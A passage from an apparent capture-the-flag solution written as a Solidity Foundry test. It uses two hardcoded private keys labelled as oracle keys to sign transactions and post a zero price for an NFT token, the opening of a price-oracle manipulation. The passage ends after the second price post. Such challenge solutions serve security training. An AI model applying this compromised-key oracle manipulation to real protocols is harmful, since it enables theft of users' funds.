...
contract CompromisedChallenge is Test {
    ...
    function test_compromised() public checkSolved {
        uint256 orace1_pk = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
        uint256 orace2_pk = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
        vm.startBroadcast(orace1_pk);
        oracle.postPrice("DVNFT", 0);
        vm.stopBroadcast();
        vm.startBroadcast(orace2_pk);
        oracle.postPrice("DVNFT", 0);
        vm.stopBroadcast();
